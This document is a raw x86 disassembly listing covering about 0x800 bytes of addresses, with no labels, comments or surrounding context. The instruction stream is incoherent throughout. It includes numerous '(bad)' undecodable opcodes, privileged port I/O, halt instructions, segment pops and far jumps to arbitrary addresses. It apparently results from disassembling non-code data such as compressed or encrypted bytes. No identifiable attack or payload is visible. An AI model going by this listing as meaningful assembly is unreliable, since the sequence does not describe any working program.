  4041f7:	arpl   WORD PTR [eax],sp
  4041f9:	fcmovnbe st,st(2)
  4041fb:	fstp   DWORD PTR [esi+ebp*1+0x5]
  4041ff:	mov    bh,0x9f
  404201:	or     eax,0x18db288e
  404206:	aas    
  404207:	shl    DWORD PTR [edx-0x4dc0e449],1
  40420d:	xchg   esi,eax
  40420e:	cmc    
  40420f:	fs push 0xffffffd8
  404212:	mov    ds:0xff49ec57,eax
  404217:	jle    0x4041e6
  404219:	xchg   esi,eax
  40421a:	repnz push 0xffb8a00
  404220:	fsub   DWORD PTR [eax+ebp*4+0x5d]
  404224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404225:	xor    DWORD PTR [esi],ebx
  404227:	aaa    
  404228:	mov    ds:0x2025488a,al
  40422d:	sub    eax,0x6e493b91
  404232:	mov    ebp,0x75b394d3
  404237:	fnstcw WORD PTR [esi+edx*4-0x3e]
  40423b:	gs ds retf 
  40423e:	rol    BYTE PTR [ebx-0xf],0x80
  404242:	ret    
  404243:	sar    BYTE PTR [ebx+edi*1-0x436c30df],cl
  40424a:	jae    0x404272
  40424c:	push   0xffffffa7
  40424e:	out    0x8f,eax
  404250:	in     eax,dx
  404251:	sbb    ch,BYTE PTR [ecx+0x68]
  404254:	ss hlt 
  404256:	stos   BYTE PTR es:[edi],al
  404257:	fld    DWORD PTR [esi+0x72a259e7]
  40425d:	dec    edx
  40425e:	fnsave [eax+0x67]
  404261:	pop    es
  404262:	and    eax,0xbeb47fc4
  404267:	mov    cl,0xcf
  404269:	sbb    DWORD PTR [eax],eax
  40426b:	aas    
  40426c:	jge    0x40425c
  40426e:	mov    bl,0x51
  404270:	sbb    ch,BYTE PTR [esp+ebx*4+0x75418d1f]
  404277:	jl     0x404254
  404279:	adc    eax,0x85ac946f
  40427e:	mov    eax,DWORD PTR [ecx]
  404280:	sub    cl,BYTE PTR [edx+esi*8+0x6d1af13b]
  404287:	js     0x404266
  404289:	dec    ebp
  40428a:	cmc    
  40428b:	jmp    0x7008:0xaceacb66
  404292:	pop    edx
  404293:	fisttp DWORD PTR [edx+0x4817fc06]
  404299:	ficom  WORD PTR [edi-0x307abb3c]
  40429f:	or     ebp,esi
  4042a1:	dec    ecx
  4042a2:	in     eax,dx
  4042a3:	lds    edi,FWORD PTR [ebp+0x22]
  4042a6:	loop   0x4042a9
  4042a8:	adc    BYTE PTR [ecx-0x1b],al
  4042ab:	push   esi
  4042ac:	mov    ch,cl
  4042ae:	sahf   
  4042af:	xor    dl,bh
  4042b1:	addr16 fwait
  4042b3:	and    al,BYTE PTR [ecx+0xeb2fb03]
  4042b9:	and    cl,al
  4042bb:	(bad)  
  4042bc:	jmp    0x404289
  4042be:	call   0x71dbcf46
  4042c3:	dec    eax
  4042c4:	(bad)  
  4042c5:	pop    esi
  4042c6:	mov    esi,0x57d539c1
  4042cb:	jmp    0xd3b:0xf7a6c4b9
  4042d2:	gs imul ecx,ebx,0xc916cc5b
  4042d9:	lds    edi,FWORD PTR [edx+0x62]
  4042dc:	xor    BYTE PTR [eax+ecx*1+0x52],dl
  4042e0:	loopne 0x4042a7
  4042e2:	jl     0x404351
  4042e4:	pop    es
  4042e5:	dec    ecx
  4042e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042e7:	mov    ebp,0xe914d683
  4042ec:	mov    esi,0x2fd445f1
  4042f1:	inc    esp
  4042f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042f3:	jno    0x404284
  4042f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f7:	mov    eax,0x490adcb2
  4042fc:	pop    edx
  4042fd:	out    0x3a,al
  4042ff:	adc    eax,0xb33b27a3
  404304:	jnp    0x404308
  404306:	pop    ebx
  404307:	pop    esp
  404308:	out    dx,al
  404309:	(bad)  
  40430a:	dec    ecx
  40430b:	sti    
  40430c:	dec    esi
  40430d:	pop    edx
  40430e:	scas   al,BYTE PTR es:[edi]
  40430f:	stos   DWORD PTR es:[edi],eax
  404310:	jb     0x40438e
  404312:	xor    DWORD PTR [eax+0x15],eax
  404315:	sub    eax,0x18416355
  40431a:	int3   
  40431b:	mov    ebp,0xde664fcd
  404320:	mov    ebp,0x1105bb0d
  404325:	inc    ebx
  404326:	(bad)  
  404327:	pop    esp
  404328:	jb     0x4042f8
  40432a:	loopne 0x4042e6
  40432c:	fsubr  QWORD PTR [ecx-0x1da2be11]
  404332:	sbb    BYTE PTR [ecx+0x25],dh
  404335:	add    al,0xb1
  404337:	ss ss (bad) 
  40433a:	loop   0x40435e
  40433c:	loopne 0x4042d2
  40433e:	mov    al,ds:0x18f89b87
  404343:	dec    ecx
  404344:	jmp    DWORD PTR [edi+0x737198b7]
  40434a:	jp     0x40430d
  40434c:	stos   DWORD PTR es:[edi],eax
  40434d:	xor    ecx,edi
  40434f:	inc    ebp
  404350:	jl     0x4042e7
  404352:	mov    ds:0xd1cb7110,al
  404357:	sbb    edi,ebp
  404359:	in     al,dx
  40435a:	inc    ecx
  40435b:	(bad)  
  40435c:	push   esi
  40435d:	sub    al,BYTE PTR [edx+0x74]
  404360:	xlat   BYTE PTR ds:[ebx]
  404361:	push   edi
  404362:	add    DWORD PTR [edi+edx*4-0x73],0xdcf5248b
  40436a:	adc    eax,DWORD PTR [edx]
  40436c:	xor    ecx,edi
  40436e:	xchg   ebx,eax
  40436f:	sar    ebp,0x1c
  404372:	xor    bh,dl
  404374:	loope  0x40430f
  404376:	out    dx,al
  404377:	mov    edx,0x91041263
  40437c:	(bad)  
  40437d:	mov    ah,0xb0
  40437f:	xchg   esp,eax
  404380:	add    dl,BYTE PTR [edi]
  404382:	outs   dx,BYTE PTR ds:[esi]
  404383:	fisubr WORD PTR [ebx]
  404385:	xor    al,0xc4
  404387:	fisttp WORD PTR [esi]
  404389:	aaa    
  40438a:	stos   BYTE PTR es:[edi],al
  40438b:	push   ecx
  40438c:	fldcw  WORD PTR [edx]
  40438e:	jmp    0xd3312e7e
  404393:	mov    BYTE PTR [ebx],al
  404395:	add    DWORD PTR [ecx],ebx
  404397:	cmp    eax,0xf7608420
  40439c:	mov    BYTE PTR [edx-0x5a],cl
  40439f:	sub    dl,BYTE PTR [edx]
  4043a1:	xor    ah,al
  4043a3:	mov    DWORD PTR [esi+0x74],esi
  4043a6:	(bad)  
  4043a7:	fbstp  TBYTE PTR [ebp-0x56]
  4043aa:	sbb    eax,0x636afb39
  4043af:	dec    edi
  4043b0:	les    ebp,FWORD PTR [eax-0x68]
  4043b3:	mov    esp,0x2a18cb27
  4043b8:	stos   BYTE PTR es:[edi],al
  4043b9:	xchg   eax,edi
  4043bb:	scas   eax,DWORD PTR es:[edi]
  4043bc:	jmp    0x404354
  4043be:	mov    dh,0x97
  4043c0:	mov    ss,WORD PTR [ecx+0x18191582]
  4043c6:	les    ebx,FWORD PTR [ecx]
  4043c8:	outs   dx,DWORD PTR ds:[esi]
  4043c9:	mov    esi,0xb1b0f858
  4043ce:	(bad)  
  4043cf:	and    ebx,DWORD PTR [esi]
  4043d1:	jnp    0x404430
  4043d3:	inc    ebx
  4043d4:	enter  0x9fcf,0xa7
  4043d8:	inc    edx
  4043d9:	xor    BYTE PTR ds:0xc5a5b437,bl
  4043df:	or     eax,0xf5287c8
  4043e4:	jmp    0xc73988c5
  4043e9:	xor    DWORD PTR [ebx],0xe
  4043ec:	cmp    BYTE PTR [esi],ch
  4043ee:	mov    fs,WORD PTR [eax+0x13]
  4043f1:	outs   dx,BYTE PTR ds:[esi]
  4043f2:	jns    0x404381
  4043f4:	sub    dl,BYTE PTR [edi-0x44d16b13]
  4043fa:	leave  
  4043fb:	mov    ebp,DWORD PTR [ebp+ebp*4+0x74d8790c]
  404402:	loop   0x4043b1
  404404:	cmp    BYTE PTR [ebx+0x5d],ah
  404407:	imul   eax,DWORD PTR [esi+0x44],0x5c8f44e4
  40440e:	test   esp,ebp
  404410:	gs inc edi
  404412:	add    BYTE PTR [edi-0x2a5ee751],al
  404418:	call   0x2f869bb4
  40441d:	shr    DWORD PTR [edi-0x60f6d20e],cl
  404423:	dec    ebp
  404424:	div    DWORD PTR [ebx-0x21cea0a2]
  40442a:	gs fsub st,st(7)
  40442d:	sub    eax,0x96e37ab9
  404432:	add    ebp,DWORD PTR [ebx+0x20e608bb]
  404438:	dec    eax
  404439:	cmp    dh,BYTE PTR [ebx]
  40443b:	cmp    al,ch
  40443d:	ja     0x4043ea
  40443f:	aad    0x5c
  404441:	lea    eax,[esi-0x4aa3d7f7]
  404447:	nop
  404448:	push   ebx
  404449:	push   edi
  40444a:	ins    DWORD PTR es:[edi],dx
  40444b:	or     bl,dl
  40444d:	ds inc eax
  40444f:	jg     0x40445c
  404451:	and    esp,DWORD PTR [ebx+0x4916c974]
  404457:	xor    cl,BYTE PTR [esp+edi*1+0xb]
  40445b:	js     0x4043ef
  40445d:	fimul  DWORD PTR ds:0xd3d5e312
  404463:	xchg   edi,eax
  404464:	push   edi
  404465:	lahf   
  404466:	pushf  
  404467:	and    cl,BYTE PTR [eax-0x67]
  40446a:	scas   al,BYTE PTR es:[edi]
  40446b:	stos   DWORD PTR es:[edi],eax
  40446c:	clc    
  40446d:	sbb    BYTE PTR [esi+ecx*1+0x771a1566],al
  404474:	jp     0x40444c
  404476:	adc    BYTE PTR [edi],0x82
  404479:	addr16 xor eax,0x49c355c5
  40447f:	data16 je 0x4044e0
  404482:	(bad)  
  404483:	push   esi
  404484:	loopne 0x404415
  404486:	dec    ebx
  404487:	adc    cl,BYTE PTR [edi]
  404489:	cmc    
  40448a:	sbb    ebx,ecx
  40448c:	jg     0x40446b
  40448e:	clc    
  40448f:	(bad)  
  404490:	mov    ebp,0x3d2f21be
  404495:	test   BYTE PTR [ebx-0x39],0x96
  404499:	imul   edi,DWORD PTR [edi+0x7fb02802],0xb31a9a9e
  4044a3:	adc    DWORD PTR [eax+eax*1+0x74],ecx
  4044a7:	jle    0x404456
  4044a9:	push   edx
  4044aa:	mov    esp,0xe5969571
  4044af:	mov    al,0x4c
  4044b1:	enter  0xe7ec,0x4e
  4044b5:	fistp  WORD PTR [edx+0x6c8c0908]
  4044bb:	add    eax,0x770cf1e0
  4044c0:	inc    eax
  4044c1:	jmp    0x1e39e8e4
  4044c6:	int3   
  4044c7:	dec    ecx
  4044c8:	mov    ecx,0xc54c3dbe
  4044cd:	jp     0x4044f2
  4044cf:	add    al,0xf8
  4044d1:	inc    edi
  4044d2:	shr    DWORD PTR [edx],0x3f
  4044d5:	arpl   sp,cx
  4044d7:	dec    esi
  4044d8:	jmp    0x8ed3:0x1f8c4f15
  4044df:	jo     0x4044fb
  4044e1:	push   edx
  4044e2:	cmp    esi,DWORD PTR [edx]
  4044e4:	enter  0x2057,0x1
  4044e8:	cwde   
  4044e9:	inc    ebp
  4044ea:	mov    eax,0xe9ff8cc9
  4044ef:	out    0xae,eax
  4044f1:	cdq    
  4044f2:	(bad)  
  4044f3:	rcl    BYTE PTR [ebx-0x38f0c801],1
  4044f9:	sbb    DWORD PTR [ebx*4+0x29e7ba64],0x9c911304
  404504:	and    eax,0x94e4226a
  404509:	jb     0x404561
  40450b:	pop    ecx
  40450c:	sub    al,0x4b
  40450e:	add    DWORD PTR [eax-0x7b08444f],ebx
  404514:	adc    esp,DWORD PTR [eax]
  404516:	sbb    BYTE PTR [ebx],bl
  404518:	cmp    eax,0x3f262d13
  40451d:	retf   
  40451e:	jmp    0xed83b43d
  404523:	jmp    0x404514
  404525:	inc    esi
  404526:	shr    DWORD PTR [ecx+0x5735583a],0x1a
  40452d:	stc    
  40452e:	mov    edx,0xa72f6f16
  404533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404534:	sahf   
  404535:	xchg   ebp,eax
  404536:	jne    0x4045a1
  404538:	mov    ?,WORD PTR [ebx-0x38f8e5be]
  40453e:	aas    
  40453f:	mov    edi,0x60c53930
  404544:	or     DWORD PTR [ebp+0xf61a80a],esi
  40454a:	xchg   ecx,eax
  40454b:	adc    DWORD PTR [ebp-0x1392973f],eax
  404551:	pop    ss
  404552:	mov    ?,WORD PTR ds:0x215c0055
  404558:	ret    
  404559:	icebp  
  40455a:	jmp    0xfed10d59
  40455f:	push   cs
  404560:	xor    eax,0x888a4095
  404565:	sbb    al,0x24
  404567:	std    
  404568:	xor    esp,DWORD PTR [eax+0x56]
  40456b:	xchg   ecx,eax
  40456c:	pop    ss
  40456d:	pop    ebp
  40456e:	mov    eax,ds:0x2b04f070
  404573:	or     BYTE PTR [ebx+esi*4+0x68],dh
  404577:	js     0x40454d
  404579:	lock mov al,ds:0x2f4a7197
  40457f:	in     al,0x79
  404581:	push   ss
  404582:	pop    es
  404583:	and    al,0x4
  404585:	inc    eax
  404586:	inc    esi
  404587:	mov    edi,0xfc37d1d5
  40458c:	inc    ebp
  40458d:	mov    ds:0x252baa45,al
  404592:	mov    ebx,0xeaf9d324
  404597:	sbb    edi,0xa
  40459a:	sbb    esi,DWORD PTR [ecx]
  40459c:	jmp    0x404619
  40459e:	push   esi
  40459f:	repz sub eax,0xc0d6d0a3
  4045a5:	bound  ecx,QWORD PTR [edx-0x245d46a3]
  4045ab:	stc    
  4045ac:	gs jo  0x40462b
  4045af:	cld    
  4045b0:	adc    eax,0xafd698fc
  4045b5:	fidivr DWORD PTR [ecx]
  4045b7:	je     0x404582
  4045b9:	dec    DWORD PTR [ebx]
  4045bb:	mov    bh,0xc6
  4045bd:	pop    ss
  4045be:	and    BYTE PTR [esi+0x5a],cl
  4045c1:	cmp    al,0x17
  4045c3:	jo     0x4045db
  4045c5:	fsubr  QWORD PTR [ebp-0x76344c3f]
  4045cb:	inc    ebp
  4045cc:	dec    edx
  4045cd:	push   cs
  4045ce:	test   al,0xf0
  4045d0:	daa    
  4045d1:	scas   al,BYTE PTR es:[edi]
  4045d2:	pop    eax
  4045d3:	adc    al,0xb
  4045d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045d6:	fmul   DWORD PTR [edx-0xd2dfd0b]
  4045dc:	mov    dl,0x28
  4045de:	pop    ecx
  4045df:	or     cl,BYTE PTR [esp+eax*2-0x6e]
  4045e3:	(bad)  
  4045e4:	sub    al,0x6b
  4045e6:	cmp    al,0x56
  4045e8:	arpl   WORD PTR [esi],bp
  4045ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045eb:	jbe    0x404591
  4045ed:	scas   al,BYTE PTR es:[edi]
  4045ee:	or     eax,0xd31fbc67
  4045f3:	mov    esp,DWORD PTR [esi]
  4045f5:	dec    esi
  4045f6:	cmp    BYTE PTR [edi],bh
  4045f8:	sub    DWORD PTR [ebx],ecx
  4045fa:	push   ebx
  4045fb:	into   
  4045fc:	leave  
  4045fd:	in     al,0xbd
  4045ff:	ins    BYTE PTR es:[edi],dx
  404600:	sbb    eax,0x43dc0da5
  404605:	mov    ds:0x995506e3,al
  40460a:	loope  0x404600
  40460c:	xor    bh,BYTE PTR [edi-0x2fa8b022]
  404612:	mov    al,ds:0xee5ce302
  404617:	jmp    0x4045fe
  404619:	dec    edx
  40461a:	ret    
  40461b:	mov    ds:0xe2dbb251,al
  404620:	pop    es
  404621:	outs   dx,BYTE PTR ds:[esi]
  404622:	ja     0x4045a4
  404624:	jle    0x40469d
  404626:	scas   eax,DWORD PTR es:[edi]
  404627:	repz pusha 
  404629:	cdq    
  40462a:	mov    ebx,0xb1432a12
  40462f:	pop    esi
  404630:	div    BYTE PTR [esi]
  404632:	inc    esi
  404633:	shl    DWORD PTR [esi+0x254260ef],1
  404639:	adc    al,0x32
  40463b:	sub    cl,0x8
  40463e:	in     al,0x76
  404640:	in     al,dx
  404641:	and    ebx,ebp
  404643:	pop    ds
  404644:	xlat   BYTE PTR ds:[ebx]
  404645:	pop    eax
  404646:	inc    ebx
  404647:	xor    eax,0x57bddac8
  40464c:	(bad)  
  40464d:	cli    
  40464e:	mov    edi,0xd83a051d
  404653:	sbb    dl,BYTE PTR [ebx+0x58]
  404656:	cli    
  404657:	push   esi
  404658:	mov    ah,0xff
  40465a:	lock pop ds
  40465c:	les    eax,FWORD PTR [ebx]
  40465e:	mov    al,ds:0x244a79d5
  404663:	xor    DWORD PTR [edx-0x9],0xffffffd5
  404667:	dec    ebx
  404668:	sub    BYTE PTR [edi-0x14cde473],ah
  40466e:	mul    BYTE PTR [esp+ecx*4+0x7ec412d6]
  404675:	mov    ecx,0x3f0c7857
  40467a:	inc    ebp
  40467b:	adc    dl,BYTE PTR [edx-0x9]
  40467e:	inc    ebp
  40467f:	mov    ah,0xbb
  404681:	adc    cl,BYTE PTR [esi+edi*2]
  404684:	fwait
  404685:	das    
  404686:	sub    BYTE PTR [edx+0x4e],al
  404689:	xor    eax,0xd9e404e3
  40468e:	and    eax,0xbe7961c5
  404693:	adc    esi,eax
  404695:	aam    0x49
  404697:	push   eax
  404698:	sti    
  404699:	(bad)  
  40469a:	xchg   esp,eax
  40469b:	hlt    
  40469c:	mov    esi,DWORD PTR [esi-0x44]
  40469f:	(bad)  
  4046a0:	bound  esi,QWORD PTR [esi-0x7b]
  4046a3:	push   edi
  4046a4:	lock idiv DWORD PTR [edi+0x205f7a04]
  4046ab:	sbb    al,0x64
  4046ad:	(bad)  
  4046ae:	in     al,0x0
  4046b0:	ret    0x1fc0
  4046b3:	mov    edi,0xd066df8a
  4046b8:	and    bh,BYTE PTR [edx]
  4046ba:	scas   al,BYTE PTR es:[edi]
  4046bb:	xchg   ebx,eax
  4046bc:	cmc    
  4046bd:	loop   0x404725
  4046bf:	add    al,0xcd
  4046c1:	in     eax,0x29
  4046c3:	dec    esp
  4046c4:	jne    0x40467e
  4046c6:	pop    edi
  4046c7:	data16 sbb BYTE PTR [ebp-0x19027389],0xb
  4046cf:	and    BYTE PTR [ecx-0x78],0x79
  4046d3:	sbb    BYTE PTR [edx+0x5b],bh
  4046d6:	mov    bl,0x73
  4046d8:	dec    ebx
  4046d9:	mov    eax,0x8c61e12b
  4046de:	jle    0x4046d2
  4046e0:	xchg   edx,eax
  4046e1:	and    ch,BYTE PTR [edx+0x3a4b4db9]
  4046e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046e8:	inc    ebp
  4046e9:	dec    ebx
  4046ea:	inc    ebp
  4046eb:	cwde   
  4046ec:	lock and BYTE PTR [esi+0x7fdad324],al
  4046f3:	sub    dl,BYTE PTR [ecx+0x25]
  4046f6:	test   DWORD PTR [edx+ebp*1],edx
  4046f9:	in     eax,dx
  4046fa:	aad    0xa5
  4046fc:	mov    ah,0x6f
  4046fe:	ds dec edi
  404700:	test   eax,0x2855ad69
  404705:	imul   ebp,DWORD PTR [ebx],0x9
  404708:	gs or  cl,ch
  40470b:	scas   al,BYTE PTR es:[edi]
  40470c:	(bad)  [ecx]
  40470e:	pop    edi
  40470f:	jns    0x4046cd
  404711:	fsubr  QWORD PTR [edx]
  404713:	arpl   WORD PTR [esi+0x428109f3],sp
  404719:	mov    al,ds:0xe0bff878
  40471e:	or     ebx,DWORD PTR [eax+0x6e]
  404721:	mov    edx,0x62b33dd1
  404726:	sub    DWORD PTR [edi+0x7812553c],edi
  40472c:	lds    ecx,FWORD PTR [edx-0x7b]
  40472f:	dec    eax
  404730:	lds    esi,FWORD PTR [eax]
  404732:	push   ds
  404733:	data16 mov bl,0xcf
  404736:	add    al,0x6e
  404738:	bound  edx,QWORD PTR [esi-0x31]
  40473b:	jmp    0x1d9bfba6
  404740:	xor    ecx,esp
  404742:	mov    ecx,0x495bf5af
  404747:	lods   eax,DWORD PTR ds:[esi]
  404748:	outs   dx,BYTE PTR ds:[esi]
  404749:	sti    
  40474a:	xchg   edi,eax
  40474b:	aam    0x33
  40474d:	ss aad 0xfa
  404750:	lods   eax,DWORD PTR ds:[esi]
  404751:	nop
  404752:	fptan  
  404754:	xchg   esp,eax
  404755:	push   0xd4402d49
  40475a:	(bad)  
  40475b:	repnz lahf 
  40475d:	call   0xc3fbad15
  404762:	sub    eax,0x137a2516
  404767:	xor    al,0x3d
  404769:	sub    ah,BYTE PTR [edi]
  40476b:	push   ebp
  40476c:	hlt    
  40476d:	mov    bh,0xbe
  40476f:	shl    BYTE PTR [edi],cl
  404771:	std    
  404772:	jno    0x40475f
  404774:	sub    eax,0x8db22c83
  404779:	mov    cl,0x25
  40477b:	pcmpeqd mm4,QWORD PTR [edx+edi*1]
  40477f:	cmp    ah,BYTE PTR [edx+0x4a58486f]
  404785:	xchg   ecx,eax
  404786:	sbb    DWORD PTR [ecx+ebx*8-0x76],0x21
  40478b:	leave  
  40478c:	push   edi
  40478d:	iret   
  40478e:	imul   ecx,DWORD PTR [edx],0x60e99050
  404794:	mov    ds:0x540ff903,eax
  404799:	pop    ecx
  40479a:	mov    edx,0x1abb2d68
  40479f:	jmp    0x1ec:0xb45e0af2
  4047a6:	in     eax,dx
  4047a7:	jecxz  0x4047e2
  4047a9:	div    DWORD PTR [ebx-0x12]
  4047ac:	loopne 0x4047a0
  4047ae:	mov    di,bx
  4047b1:	lock jmp esi
  4047b4:	(bad)  
  4047b5:	cmp    BYTE PTR [eax],cl
  4047b7:	pop    ebp
  4047b8:	pop    ecx
  4047b9:	mov    cl,0x25
  4047bb:	test   eax,0x74bf8cc9
  4047c0:	push   sp
  4047c2:	adc    eax,0x59c09290
  4047c7:	leave  
  4047c8:	xchg   ecx,eax
  4047c9:	mov    al,ds:0xbfb5a882
  4047ce:	push   0xffffffa1
  4047d0:	mov    ch,0x3b
  4047d2:	neg    bl
  4047d4:	dec    esp
  4047d5:	test   DWORD PTR [esi-0x8d7c235],ebp
  4047db:	inc    edi
  4047dc:	(bad)  
  4047dd:	mov    edi,0x87262912
  4047e2:	inc    eax
  4047e3:	mov    dh,0x91
  4047e5:	clc    
  4047e6:	(bad)  
  4047e7:	call   0x5f03:0x7e9010fd
  4047ee:	sub    eax,0x9cd7a221
  4047f3:	inc    edx
  4047f4:	ret    
  4047f5:	jno    0x4047c1
  4047f7:	xor    bh,BYTE PTR [esi+0x5c652433]
  4047fd:	sub    bh,bh
  4047ff:	fdivr  st(2),st
  404801:	xchg   si,ax
  404803:	push   esp
  404804:	add    eax,DWORD PTR [ebp+0x501afe42]
  40480a:	jg     0x40479a
  40480c:	sub    ecx,DWORD PTR [eax-0x4f69523d]
  404812:	dec    ebx
  404813:	add    eax,ecx
  404815:	fadd   QWORD PTR [eax-0x48]
  404818:	sti    
  404819:	inc    ebp
  40481a:	xchg   edx,eax
  40481b:	std    
  40481c:	mov    bl,0x46
  40481e:	(bad)  
  40481f:	iret   
  404820:	imul   ebx,DWORD PTR [edi],0x183a1bd9
  404826:	xor    al,0x1e
  404828:	xchg   edx,eax
  404829:	jmp    0x4047fa
  40482b:	mov    WORD PTR [ecx],?
  40482d:	inc    edi
  40482e:	mov    ebp,0xb9a74c33
  404833:	jb     0x40480d
  404835:	sbb    BYTE PTR [edx+ecx*1],bl
  404838:	loopne 0x404834
  40483a:	sbb    al,0x27
  40483c:	jecxz  0x404895
  40483e:	dec    edx
  40483f:	clc    
  404840:	stos   BYTE PTR es:[edi],al
  404841:	test   eax,0x8fc6856c
  404846:	test   BYTE PTR [esi-0xa0b03de],0xfb
  40484d:	cli    
  40484e:	sti    
  40484f:	(bad)  
  404851:	scas   eax,DWORD PTR es:[edi]
  404852:	mov    bl,0xf8
  404854:	jb     0x4048a9
  404856:	int    0xf5
  404858:	dec    edx
  404859:	ret    
  40485a:	mov    ah,0x76
  40485c:	pop    eax
  40485d:	shr    DWORD PTR [ebx-0x16b8c252],1
  404863:	push   edi
  404864:	test   eax,ebp
  404866:	xor    eax,0xb4927487
  40486b:	push   edx
  40486c:	sub    al,0x30
  40486e:	push   edx
  40486f:	pop    ebp
  404870:	sub    dl,al
  404872:	hlt    
  404873:	iret   
  404874:	adc    al,0x7a
  404876:	das    
  404877:	or     esi,DWORD PTR [ecx]
  404879:	inc    ebx
  40487a:	mov    dl,0x17
  40487c:	add    cl,BYTE PTR [eax-0x2f]
  40487f:	xchg   ebx,eax
  404880:	xor    dl,ah
  404882:	pop    ss
  404883:	dec    esp
  404884:	retf   0x9608
  404887:	scas   al,BYTE PTR es:[edi]
  404888:	js     0x404831
  40488a:	imul   ebp,DWORD PTR [ecx],0xe0df5a6f
  404890:	mov    BYTE PTR [ebp-0x307f125b],cl
  404896:	add    al,BYTE PTR [eax-0x50b3a8f8]
  40489c:	pop    esp
  40489d:	icebp  
  40489e:	cmp    ebp,edx
  4048a0:	fisubr DWORD PTR [eax+ebx*4-0x49bf1856]
  4048a7:	mov    ebx,0x9c3322d4
  4048ac:	mov    dh,al
  4048ae:	jmp    0x46e8913b
  4048b3:	push   0x1318c11b
  4048b8:	add    ecx,DWORD PTR [ecx-0x1]
  4048bb:	and    edi,DWORD PTR [ebx+eax*1+0x62]
  4048bf:	inc    edi
  4048c0:	bound  esi,QWORD PTR [ecx+0x2252caee]
  4048c6:	in     eax,dx
  4048c7:	cmp    ecx,eax
  4048c9:	inc    esi
  4048ca:	xchg   ebp,eax
  4048cb:	scas   eax,DWORD PTR es:[edi]
  4048cc:	hlt    
  4048cd:	inc    edx
  4048ce:	dec    edi
  4048cf:	mov    cl,0xb
  4048d1:	sub    bh,BYTE PTR [eax+0x49]
  4048d4:	or     DWORD PTR [edi+0x75],eax
  4048d7:	xchg   BYTE PTR [ebx],ch
  4048d9:	outs   dx,DWORD PTR ds:[esi]
  4048da:	bound  ebx,QWORD PTR [ebp-0x4ccf47ea]
  4048e0:	mov    ?,WORD PTR [ecx+0x64]
  4048e3:	push   dx
  4048e5:	popa   
  4048e6:	inc    ecx
  4048e7:	cmp    al,BYTE PTR [esi-0x43d4b127]
  4048ed:	(bad)  
  4048ef:	mov    esp,0xba2ee7e2
  4048f4:	outs   dx,DWORD PTR ds:[esi]
  4048f5:	lods   eax,DWORD PTR ds:[si]
  4048f7:	outs   dx,BYTE PTR ds:[esi]
  4048f8:	push   cs
  4048f9:	mov    edi,0x50c74f7b
  4048fe:	mov    ds:0x578f907a,eax
  404903:	rol    DWORD PTR [ebx+0x0],0x4c
  404907:	push   0x38f7d88e
  40490c:	rol    DWORD PTR [esi+0x3f4d5c7c],1
  404912:	xchg   DWORD PTR [esi+0x58b37bb2],esp
  404918:	jne    0x4048c6
  40491a:	push   0xffffff85
  40491c:	mov    dl,0xd
  40491f:	fsub   QWORD PTR [edx-0x2b02346a]
  404925:	(bad)  
  404927:	jb     0x404977
  404929:	pop    ss
  40492a:	dec    eax
  40492b:	test   eax,0xa8f9bee
  404930:	aas    
  404931:	clc    
  404932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404933:	pop    ds
  404934:	mov    cl,0x3d
  404936:	sbb    DWORD PTR [edi+0x5],ecx
  404939:	push   ebp
  40493a:	aam    0x87
  40493c:	mov    ds:0x8ede2e2e,eax
  404941:	popf   
  404942:	adc    DWORD PTR [eax],edx
  404944:	cmc    
  404945:	xchg   BYTE PTR [edi+0x3c4b1c8b],bh
  40494b:	pop    ebx
  40494c:	cs jmp 0x97bc:0x5285d946
  404954:	enter  0xfdd5,0x5d
  404958:	sbb    eax,0xfe8072ec
  40495d:	and    ch,BYTE PTR [esi+0x52]
  404960:	and    BYTE PTR [eax],0x84
  404963:	jg     0x404992
  404965:	es lock mov eax,0xe7aedc1b
  40496c:	int3   
  40496d:	int3   
  40496e:	out    dx,al
  40496f:	jo     0x404942
  404971:	or     BYTE PTR [eax+0x56738313],cl
  404977:	fistp  WORD PTR [ecx+ebp*4+0x505747c4]
  40497e:	std    
  40497f:	ins    DWORD PTR es:[edi],dx
  404980:	mov    ebp,0xf7e4c138
  404985:	popf   
  404986:	(bad)  
  404987:	das    
  404988:	lods   al,BYTE PTR ds:[esi]
  404989:	inc    esp
  40498a:	xchg   BYTE PTR [ebp-0x5ef8ca14],bh
  404990:	and    BYTE PTR [edx],0x47
  404993:	mov    edi,0x83852170
  404998:	inc    ebp
  404999:	test   al,0xd7
  40499b:	popa   
  40499c:	hlt    
  40499d:	mov    ds:0xaf9651a3,eax
  4049a2:	add    cl,dl
  4049a4:	jmp    0xe5ab5787
  4049a9:	sub    DWORD PTR [eax],edx
  4049ab:	retf   
  4049ac:	loopne 0x4049e2
  4049ae:	sahf   
  4049af:	loop   0x4049cd
  4049b1:	and    ebx,edx
  4049b3:	add    bl,ch
  4049b5:	hlt    
  4049b6:	pop    ds
  4049b7:	inc    esp
  4049b8:	je     0x40497f
  4049ba:	jns    0x404a0a
  4049bc:	mov    eax,0x5674fb93
  4049c1:	xor    BYTE PTR [edi+0x2fa6bcc5],0x15
  4049c8:	jo     0x40497e
  4049ca:	int3   
  4049cb:	ja     0x4049de
  4049cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049ce:	lds    ebp,FWORD PTR [eax]
  4049d0:	adc    esp,ebp
  4049d2:	mov    bl,0xb1
  4049d4:	lods   eax,DWORD PTR ds:[esi]
  4049d5:	not    BYTE PTR [ebx-0x4c0da33c]
  4049db:	or     esi,eax
  4049dd:	out    0xaf,al
  4049df:	pop    eax
  4049e0:	mov    al,0x8a
  4049e2:	repz pop es
  4049e4:	fsub   QWORD PTR [eax]
  4049e6:	inc    eax
  4049e7:	aam    0x6c
  4049e9:	jb     0x404a53
  4049eb:	xchg   BYTE PTR [edx+0x4652cbbe],al
  4049f1:	std    
  4049f2:	push   0xffffff8a
  4049f4:	dec    edi
  4049f5:	adc    bh,BYTE PTR [esi+eiz*4+0x2b]
  4049f9:	call   FWORD PTR [ebp+0x5bd48f96]
  4049ff:	enter  0xe5a4,0xba
  404a03:	xchg   ebp,eax
